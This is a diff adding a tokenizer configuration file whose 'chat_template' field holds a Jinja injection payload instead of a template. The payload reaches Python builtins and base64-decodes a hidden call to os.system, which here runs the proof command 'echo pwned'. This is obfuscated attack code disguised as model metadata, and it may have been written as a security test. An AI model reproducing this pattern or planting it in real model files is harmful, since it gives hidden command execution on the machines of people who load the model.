@@ -1,0 +1,5 @@
+{
+  "tokenizer_class": "BertTokenizer",
+  "chat_template": "{{ __builtins__.__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2VjaG8gcHduZWQnKQ==').decode() }}",
+  "model_max_length": 512
+}
